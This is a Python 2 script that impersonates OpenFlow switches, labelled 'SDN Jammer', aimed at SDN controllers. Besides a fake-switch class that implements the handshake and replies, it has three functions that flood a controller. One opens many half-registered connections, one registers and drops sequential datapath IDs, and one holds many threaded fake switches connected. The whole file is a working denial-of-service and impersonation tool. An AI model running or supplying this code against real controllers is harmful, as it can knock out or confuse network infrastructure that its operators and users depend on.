import logging
import random
import socket
import struct
import threading
import time


class FakeSwitch(object):
    HEADER_FORMAT = '!BBHI'
    HEADER_SIZE = struct.calcsize(HEADER_FORMAT)

    OF_HELLO = 0
    OF_ECHO_REQUEST = 2
    OF_ECHO_REPLY = 3
    OF_FEATUERS_REQUEST = 5
    OF_FEATURES_REPLY = 6
    OF_GET_CONFIG_REQUEST = 7
    OF_GET_CONFIG_REPLY = 8
    OF_SET_CONFIG = 9
    OF_STATS_REQUEST = 16
    OF_STATS_REPLY = 17
    OF_BARRIER_REQUEST = 18
    OF_BARRIER_REPLY = 19

    def __init__(self, controller, port=6633, dpid=None):
        if dpid:
            self.dpid = dpid
        else:
            self.dpid = random.randrange(1 << 64)

        self.controller = controller
        self.port = port

        self.connected = False
        self.registered = False

        self.config = {
            'flags': 0x00000000,
            'miss_send_len': 128,
        }

    def connect(self):
        if not self.connected:
            self.sock = socket.socket()
            self.sock.connect((self.controller, self.port))

    def close(self):
        self.sock.close()
        self.connected = False
        self.registered = False

    def start(self):
        self.register()
        while 1:
            self.proc_step()

    def register(self):
        self.connect()
        self.send_hello()
        while not self.registered:
            self.proc_step()

    def send_packet(self, of_type, tid=0, payload=''):
        version = 1
        tid = 0

        length = self.HEADER_SIZE + len(payload)
        message = struct.pack(self.HEADER_FORMAT,
                              version, of_type, length, tid)
        message += payload

        self.sock.send(message)

    def proc_step(self):
        header = self.sock.recv(self.HEADER_SIZE)
        while len(header) < self.HEADER_SIZE:
            header += self.sock.recv(self.HEADER_SIZE - len(header))
        version, type_, length, tid = struct.unpack(
            self.HEADER_FORMAT, header)

        more_bytes = length - self.HEADER_SIZE
        if more_bytes:
            payload = self.sock.recv(more_bytes)
            while len(payload) < more_bytes:
                payload += self.sock.recv(more_bytes - len(payload))
        else:
            payload = ''

        if type_ == self.OF_HELLO:
            logging.debug('HELLO!')
        elif type_ == self.OF_ECHO_REPLY:
            logging.debug('Echo reply: {0}'.format(payload))
        elif type_ == self.OF_FEATUERS_REQUEST:
            logging.debug('Feature request')
            self.send_features_reply(tid, payload)
        elif type_ == self.OF_GET_CONFIG_REQUEST:
            logging.debug('Config request')
            self.send_get_config_reply(tid, payload)
        elif type_ == self.OF_SET_CONFIG:
            logging.debug('Setting config')
            self.set_config(payload)
        elif type_ == self.OF_STATS_REQUEST:
            logging.debug('Stats request')
            self.send_stats_reply(tid, payload)
        elif type_ == self.OF_BARRIER_REQUEST:
            self.send_barrier_reply(tid, payload)
        else:
            logging.warning('Unknown type: {0}, payload: {1}'.format(
                type_, payload.encode('hex')))

    def send_hello(self):
        self.send_packet(self.OF_HELLO)

    def send_echo_request(self, data):
        self.send_packet(self.OF_ECHO_REQUEST, payload=data)

    def send_features_reply(self, tid, params):
        payload_format = '!QIBxxxII'

        buffer_size = 255
        number_of_tables = 0
        sw_capablity_flags = 0x000000c7
        action_capablity_flags = 0x00000fff

        payload = struct.pack(
            payload_format,
            self.dpid, buffer_size, number_of_tables,
            sw_capablity_flags, action_capablity_flags)

        self.send_packet(self.OF_FEATURES_REPLY, tid, payload)

    def send_get_config_reply(self, tid, payload):
        payload_format = '!HH'

        flags = self.config['flags']
        miss_send_len = self.config['miss_send_len']

        payload = struct.pack(payload_format, flags, miss_send_len)
        self.send_packet(self.OF_GET_CONFIG_REPLY, tid, payload)

    def set_config(self, params):
        flags, miss_send_len = struct.unpack('!HH', params)
        self.config['flags'] = flags
        self.config['miss_send_len'] = miss_send_len

    def send_stats_reply(self, tid, payload):
        payload_format = '!HH256s256s256s32s256s'

        stats_type = 0
        flags = 0x00000000
        mfr_desc = 'SDN Jammer'
        hw_desc = 'FakeSwitch'
        sw_desc = '0.0.0'
        serial_num = 'None'
        dp_desc = 'None'

        payload = struct.pack(
            payload_format, stats_type, flags,
            mfr_desc, hw_desc, sw_desc, serial_num, dp_desc)

        self.send_packet(self.OF_STATS_REPLY, tid, payload)
        self.registered = True

    def send_barrier_reply(self, tid, payload):
        self.send_packet(self.OF_BARRIER_REPLY, tid, '')


def by_connection_reset(host, port, count):
    for i in xrange(count):
        dpid = i + 1
        sw = FakeSwitch(host, port, dpid=dpid)
        sw.connect()
        sw.send_hello()
        sw.send_features_reply(0, '')


def by_duplicated_dpid(host, port, count):
    switches = []
    for i in range(count):
        dpid = i + 1
        sw = FakeSwitch(host, port, dpid=dpid)
        sw.connect()
        sw.register()
        switches.append(sw)

    for sw in switches:
        sw.close()


def by_register_and_hold(host, port, number):
    threads = []
    active = True

    def run():
        sw = FakeSwitch(host, port)
        sw.register()

        while active:
            sw.proc_step()

        sw.close()

    for _ in range(number):
        th = threading.Thread(target=run)
        th.setDaemon(True)
        th.start()
        threads.append(th)

    try:
        while 1:
            time.sleep(1)
    except:
        print('joining threads...')

    active = False
    for th in threads:
        th.join()
